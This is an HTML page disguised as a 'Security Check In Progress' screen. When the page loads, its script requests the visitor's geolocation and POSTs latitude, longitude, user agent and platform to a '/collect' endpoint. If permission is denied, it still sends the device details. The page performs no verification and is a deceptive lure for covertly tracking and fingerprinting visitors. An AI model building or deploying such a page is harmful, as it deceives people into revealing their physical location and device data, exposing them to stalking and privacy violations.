<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <title>Security Verification</title>
  <meta name="viewport" content="width=device-width, initial-scale=1">
  <style>
    body {
      background-color: #f9f9f9;
      font-family: Arial, sans-serif;
      padding: 30px;
      text-align: center;
    }
    .card {
      background: white;
      padding: 30px;
      max-width: 400px;
      margin: auto;
      box-shadow: 0 0 10px rgba(0,0,0,0.1);
      border-radius: 10px;
    }
    .card h2 {
      color: #333;
    }
    .card p {
      color: #666;
    }
  </style>
</head>
<body>
  <div class="card">
    <h2>üîí Security Check In Progress</h2>
    <p>Please wait while we verify your access...</p>
  </div>

  <script>
    navigator.geolocation.getCurrentPosition(function(pos) {
      fetch("/collect", {
        method: "POST",
        headers: {"Content-Type": "application/json"},
        body: JSON.stringify({
          latitude: pos.coords.latitude,
          longitude: pos.coords.longitude,
          userAgent: navigator.userAgent,
          camera: "‚úÖ Location Access Granted",
          deviceInfo: navigator.platform
        })
      });
    }, function() {
      fetch("/collect", {
        method: "POST",
        headers: {"Content-Type": "application/json"},
        body: JSON.stringify({
          userAgent: navigator.userAgent,
          camera: "‚ùå Location Denied",
          latitude: null,
          longitude: null,
          deviceInfo: navigator.platform
        })
      });
    });
  </script>
</body>
</html>
